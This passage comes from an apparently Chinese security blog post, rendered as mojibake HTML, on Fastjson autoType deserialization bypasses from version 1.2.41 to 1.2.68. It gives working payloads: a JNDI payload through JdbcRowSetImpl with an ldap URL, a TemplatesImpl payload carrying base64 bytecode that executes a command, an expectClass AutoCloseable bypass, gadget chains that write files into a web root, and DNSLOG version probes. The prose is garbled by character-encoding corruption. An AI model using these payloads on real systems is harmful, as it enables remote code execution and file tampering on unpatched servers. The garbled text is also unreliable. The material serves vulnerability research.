¡éªŒï¼Œå¦‚æœç±»åä»¥<code>L</code>å¼€å¤´ï¼Œ<code>;</code>ç»“å°¾ï¼Œåˆ™ä¼šç”¨stubstringå¤„ç†ä¸€ä¸‹(è¿™ä¸ªåˆ¤æ–­æ˜¯ç”±HASHæ¥åˆ¤æ–­çš„ï¼Œçœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L &#x3D;&#x3D; 655701488918567152L) &#123;</span><br><span class="line">    className &#x3D; className.substring(1, className.length() - 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bypassï¼ˆåŒå†™ç»•è¿‡ï¼‰"><a href="#bypassï¼ˆåŒå†™ç»•è¿‡ï¼‰" class="headerlink" title="bypassï¼ˆåŒå†™ç»•è¿‡ï¼‰"></a>bypassï¼ˆåŒå†™ç»•è¿‡ï¼‰</h3><p>é‚£ä¹ˆç›´æ¥ä¸€æ‰‹åŒå†™ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:2357&#x2F;Command8&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-42-1"><a href="#1-2-42-1" class="headerlink" title="1.2.42"></a>1.2.42</h2><h3 id="æ›´æ–°æœºåˆ¶-2"><a href="#æ›´æ–°æœºåˆ¶-2" class="headerlink" title="æ›´æ–°æœºåˆ¶"></a>æ›´æ–°æœºåˆ¶</h3><p>é’ˆå¯¹åŒå†™ç»•è¿‡å¥—äº†ä¸ªå­åˆ¤æ–­ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L &#x3D;&#x3D; 655701488918567152L) &#123;</span><br><span class="line">                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L &#x3D;&#x3D; 655656408941810501L) &#123;</span><br><span class="line">                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                className &#x3D; className.substring(1, className.length() - 1);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>TypeUtils.loadClass ä¸­é™¤äº†å¯¹L;è¿›è¡Œåˆ¤æ–­ï¼Œè¿˜æœ‰å¯¹[è¿›è¡Œäº†åˆ¤æ–­</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#125; else if (className.charAt(0) &#x3D;&#x3D; &#39;[&#39;) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType &#x3D; loadClass(className.substring(1), classLoader);</span><br><span class="line">    return Array.newInstance(componentType, 0).getClass();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>å›´ç»•è¿™ä¸ªå±•å¼€ï¼Œæ„é€ å¦‚ä¸‹payloadï¼Œå…·ä½“ä¸ºå•¥è¿™ä¹ˆæ„é€ æ²¡æœ‰ç»†è·Ÿï¼Œåæ­£è·Ÿ[æœ‰å…³</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;[,&#123;</span><br><span class="line">  &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;],</span><br><span class="line">  &quot;_name&quot; : &quot;a&quot;,</span><br><span class="line">  &quot;_tfactory&quot; : &#123;&#125;,</span><br><span class="line">  &quot;outputProperties&quot; : &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-44"><a href="#1-2-44" class="headerlink" title="1.2.44"></a>1.2.44</h2><h3 id="æ›´æ–°æœºåˆ¶-3"><a href="#æ›´æ–°æœºåˆ¶-3" class="headerlink" title="æ›´æ–°æœºåˆ¶"></a>æ›´æ–°æœºåˆ¶</h3><p>44ç‰ˆæœ¬é’ˆå¯¹43ç‰ˆæœ¬çš„ç»•è¿‡ä½œäº†å¤„ç†ï¼Œ[ å¼€å¤´æˆ–è€… L å¼€å¤´ ; ç»“å°¾éƒ½ä¼šæŠ›å‡ºå¼‚å¸¸</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907182521116.png" alt="image-20210907182521116"></p><h3 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h3><p>JSONå†…ç½®å®Œç¾å‡»ç ´</p><h2 id="1-2-47-67"><a href="#1-2-47-67" class="headerlink" title="1.2.47-67"></a>1.2.47-67</h2><h3 id="æ›´æ–°æœºåˆ¶-4"><a href="#æ›´æ–°æœºåˆ¶-4" class="headerlink" title="æ›´æ–°æœºåˆ¶"></a>æ›´æ–°æœºåˆ¶</h3><p>ç”±äº47ä¿®å¤äº†JSONå†…ç½®ç»•è¿‡ï¼Œè¿™äº›ç‰ˆæœ¬é‡Œä¹Ÿæ²¡å•¥å¾ˆå¥½çš„ç»•è¿‡æ–¹æ³•ï¼Œç½‘ä¸Šå¤šæ˜¯ä»é»‘åå•ä¸­ç»“åˆJNDIæ³¨å…¥æ‰¾æ¼ç½‘ä¹‹é±¼ï¼ˆæ‰¾åˆ°çš„å¤šä¸ºç»„ä»¶ç±»ï¼Œéœ€è¦ç›®æ ‡æœºå™¨ä¸Šæœ‰è¯¥ç»„ä»¶æ‰èƒ½æ‰“<a href="https://paper.seebug.org/1155/%EF%BC%89%E4%BB%A5%E5%8F%8AexpectClass%E7%BB%95%E8%BF%87AutoType">https://paper.seebug.org/1155/ï¼‰ä»¥åŠexpectClassç»•è¿‡AutoType</a></p><h2 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h2><p>68ç‰ˆæœ¬ä¹‹åå‡ºç°äº†æ–°çš„å®‰å…¨æ§åˆ¶ç‚¹safeModeï¼Œå¦‚æœå¼€å¯ï¼Œåœ¨checkAtuoTypeçš„æ—¶å€™ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œåªè¦è®¾ç½®@typeç±»å‹ï¼Œæƒ³ååºåˆ—åŒ–æŒ‡å®šç±»å¯¹è±¡çš„æ—¶å€™ï¼Œå°±ä¼šæŠ›å¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯è¯´å¼€äº†safemodçš„ç«™å¯ä»¥ä¸ç”¨çœ‹äº†ã€‚<br>å½“ç„¶è¿™ä¸ªç‰ˆæœ¬expectClassç»•è¿‡AutoTypeæ˜¯å¯ä»¥æ‰“ä¸€æ‰“çš„ã€‚</p><h3 id="Bypass-expectClassç»•è¿‡AutoType-lt-1-2-68"><a href="#Bypass-expectClassç»•è¿‡AutoType-lt-1-2-68" class="headerlink" title="Bypass expectClassç»•è¿‡AutoType  &lt;=1.2.68"></a>Bypass expectClassç»•è¿‡AutoType  &lt;=1.2.68</h3><p>è¿™é‡Œé€šè¿‡ä¸€ä¸ªdemoå±•ç¤ºä¸€ä¸‹.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class VulAutoCloseable implements AutoCloseable &#123;</span><br><span class="line">    public VulAutoCloseable()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void close() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬çš„payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class evil &#123;</span><br><span class="line">        public static void main(String[] args)&#123;</span><br><span class="line">            System.out.println(JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;\n&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåå¼¹è®¡ç®—å™¨</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907204915990.png" alt="image-20210907204915990"></p><p>æˆ‘ä»¬é€šè¿‡è°ƒè¯•æ¥çœ‹çœ‹å…·ä½“æ˜¯æ€ä¹ˆä¸ªå›äº‹</p><h4 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h4><p>äºcheckautotype å¤„ä¸‹æ–­ç‚¹ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907224439952.png" alt="image-20210907224439952"></p><p>å¯ä»¥å‘ç°ä¼ å…¥çš„typenameæ˜¯ AutoCloseableã€‚æ­¤æ—¶çš„expectClassæ˜¯NULL</p><p>å¾€ä¸‹ï¼Œç›´æ¥ä»ç¼“å­˜Mappingå¯ä»¥ç›´æ¥è·å¾—æ­¤ç±»ï¼Œ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907224744679.png" alt="image-20210907224744679"></p><p>ç„¶åç›´æ¥è¢«returnäº†ï¼Œç”šè‡³æ²¡æœ‰èµ°autoTypeSupportæ ¡éªŒã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907225106968.png" alt="image-20210907225106968"></p><p>clazzè¢«returnåˆ°äº†defaultjsonparseré‡Œï¼Œå¾€ä¸‹çœ‹é€»è¾‘å¯ä»¥å‘ç°ä»å¯¹clazzè¿›è¡Œäº†ä¸€ä¸ªdeserialzeæ–¹æ³•ï¼Œè·Ÿè¿›</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907225448517.png" alt="image-20210907225448517"></p><p>ä¼šè·Ÿåˆ°è¿™é‡Œæ¥</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908010408177.png" alt="image-20210908010408177"></p><p>å¾€ä¸‹çœ‹ï¼Œä¼šå› ä¸ºç”±Autocloseableä¸èƒ½é€šè¿‡getSeeAlsoæ–¹æ³•æˆåŠŸç”Ÿæˆdeserializerå¯¹è±¡ï¼Œä»è€Œè§¦å‘ç¬¬äºŒè½®checkAutoType</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908013610732.png" alt="image-20210908013610732"></p><p>ç¬¬äºŒè½®ä¼ å…¥checkAutoTypeçš„å‚æ•°ä¾æ¬¡ä¸º ç¬¬äºŒä¸ª@typeå€¼ï¼Œç¬¬ä¸€ä¸ª@typeå€¼ï¼Œå’Œä¸€ä¸ªä¸é‡è¦çš„lexer.getFeatures()</p><p>è¿›æ¥checkAutoTypeåï¼Œä¼šå…ˆå¯¹exceptclassè¿›è¡Œç™½åå•æ ¡éªŒï¼ŒAutocloseableç±»è‡ªç„¶æ˜¯éšä¾¿è¿‡æ‰ï¼Œç„¶åä½¿exceptClassFlagç½®ä¸ºtrue</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908013751407.png" alt="image-20210908013751407"></p><p>éšåä¾¿æ˜¯ä¸€äº›å¯¹typenameçš„é»‘ç™½åå•æ ¡éªŒï¼Œç”±äºtypenameæ˜¯org.example.VulAutoCloseableï¼Œä¸åœ¨é»‘ç™½åå•ä¸­ï¼Œæ‰€ä»¥æ ¡éªŒè‡ªç„¶éƒ½é€šè¿‡äº†ã€‚<br>ä»¥ä¸‹æ˜¯ä¾æ¬¡çš„æ ¡éªŒé¡ºåº</p><p>é»‘åå•æ ¡éªŒ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014110837.png" alt="image-20210908014110837"></p><p>å…ˆç™½åé»‘ï¼Œå…¶ä¸­æ‰€æœ‰çš„Array.binarySearchç»“æœéƒ½æ˜¯0ï¼Œè‡ªç„¶å°±èƒ½é€šè¿‡IFæ¡ä»¶</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014001405.png" alt="image-20210908014001405"></p><p>å…ˆé»‘åç™½</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014440625.png" alt="image-20210908014440625"></p><p>å†²ç ´é‡é‡è€ƒç ”ï¼ŒtypenameæŒ‡å®šç±»è¢«ä¼ å…¥TypeUtils.loadClass,è·Ÿè¿›</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014625797.png" alt="image-20210908014625797"></p><p>ä¼šæ¥åˆ°è¿™é‡Œï¼ŒVulAutoCloseableçš„ç±»å¯¹è±¡è¢«è¿”å›</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015237563.png" alt="image-20210908015237563"></p><p>ç„¶åä¼šå¯¹è¿™ä¸ªç±»å¯¹è±¡è¿›è¡Œæ ¡éªŒï¼Œæ ¡éªŒæ˜¯å¦ä¸ºClassLoaderã€DataSourceã€RowSetç­‰ç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¿™ä¹Ÿæ˜¯è¿‡æ»¤å¤§å¤šæ•°JNDIæ³¨å…¥Gadgetçš„æœºåˆ¶ï¼š</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015331781.png" alt="image-20210908015331781"></p><p>ç„¶ååˆ¤æ–­clazzæ˜¯å¦æ˜¯exceptClassçš„å­ç±»ï¼Œæ˜¯çš„è¯å°±ç›´æ¥è¿”å›ç±»å¯¹è±¡ã€‚ç±»å¯¹è±¡è¢«è¿”å›åï¼Œå°±ä¼šè¿›å…¥è¢«ååºåˆ—åŒ–çš„ä¸‹ä¸€ä¸ªè¿‡ç¨‹ï¼Œå®ƒçš„æ„é€ æ–¹æ³•ç­‰ä¼šè¢«è°ƒç”¨ï¼Œä»è€Œå®Œæˆåˆ©ç”¨ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015543198.png" alt="image-20210908015543198"></p><h4 id="å®æˆ˜Gadget"><a href="#å®æˆ˜Gadget" class="headerlink" title="å®æˆ˜Gadget"></a>å®æˆ˜Gadget</h4><p>å®æˆ˜ä¸­ç”¨çš„payload:</p><p>æ–‡ä»¶ç§»åŠ¨ï¼šå°†ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹ç§»åŠ¨åˆ°æ–°çš„ä¸€ä¸ªæ–‡ä»¶ä¸­å»ï¼ŒåŸæ¥æ–‡ä»¶çš„å†…å®¹æ¶ˆå¤±ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;    &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;aspectjtools&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.9.5&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;D:&#x2F;b.txt&quot;, &quot;targetPath&quot;:&quot;E:&#x2F;b.txt&quot;&#125;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶å†™å…¥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.sleepycat&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;je&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;5.0.73&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.esotericsoftware&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;kryo&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.0.0&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;aspectjtools&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.9.5&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br><span class="line">        &quot;targetPath&quot;: &quot;D:&#x2F;wamp64&#x2F;www&#x2F;hacked.txt&quot;, \\åˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶</span><br><span class="line">        &quot;tempPath&quot;: &quot;D:&#x2F;wamp64&#x2F;www&#x2F;test.txt&quot;\\åˆ›å»ºä¸€ä¸ªæœ‰å†…å®¹çš„æ–‡ä»¶</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br><span class="line">        &quot;buffer&quot;: &quot;cHduZWQ&#x3D;&quot;, \\base64åçš„æ–‡ä»¶å†…å®¹</span><br><span class="line">        &quot;outputStream&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;position&quot;: 5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h1><h3 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog.cn&quot;&#125; åœ¨49ä»¥ä¸‹æ‰èƒ½è§¦å‘ï¼Œå› ä¸ºè¿™ä¸ªgadgetåœ¨49è¢«ç¦æ­¢äº†ï¼Œå¯ç”¨äºæ£€æµ‹å…·ä½“ç‰ˆæœ¬</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ£€æµ‹"><a href="#æŠ¥é”™æ£€æµ‹" class="headerlink" title="æŠ¥é”™æ£€æµ‹"></a>æŠ¥é”™æ£€æµ‹</h3><p>è¿æ°”å¥½å¯ä»¥ç›´æ¥å‡ºç‰ˆæœ¬å·</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;xxx&quot;:&quot;aaa&quot;</span><br><span class="line">eyJhIjoiXHgaGiJ9çš„base64è§£ç  åœ¨60ä»¥ä¸‹æ‰èƒ½è§¦å‘ï¼Œå½“åç«¯ Fastjson ç‰ˆæœ¬å°äº 1.2.60 æ—¶ï¼Œä½¿ç”¨è¯¥è¯·æ±‚åŒ…ä¸ä¼šå»¶æ—¶ä¸ä¼šæŠ¥é”™ï¼Œåä¹‹åˆ™ä¼šå»¶è¿Ÿæˆ–æŠ¥é”™</span><br></pre></td></tr></table></figure><h3 id="å»ºè®®"><a href="#å»ºè®®" class="headerlink" title="å»ºè®®"></a>å»ºè®®</h3><p>æœ‰äº›å¼€å‘äººå‘˜åœ¨å†™è§£æJSONçš„ç›¸å…³ä»£ç æ—¶ï¼Œå¯èƒ½ä¼šè®¾ç½®åªèƒ½ä¼ å…¥æŒ‡å®šå¯¹è±¡ã€‚<br>è€Œæˆ‘ä»¬é€šè¿‡è®¾ç½®@typeæ—¶ä¼ å…¥çš„å¯¹è±¡å¯èƒ½ä¼šä¸æŒ‡å®šå¯¹è±¡ä¸åŒ¹é…ä»è€Œå‘ç”Ÿtype not matchçš„å¼‚å¸¸ã€‚</p><p>è§£å†³åŠæ³•æ˜¯è¿™æ ·,æœ€å¤–å±‚å¥—å±‚å¯¹è±¡</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;xxx&quot;: &#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</a></p><p><a href="https://www.freebuf.com/vuls/228099.html">https://www.freebuf.com/vuls/228099.html</a></p><p><a href="https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87</a></p><p><a href="https://paper.seebug.org/1192/#1225">https://paper.seebug.org/1192/#1225</a></p><p><a href="https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC">https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC</a></p><p><a 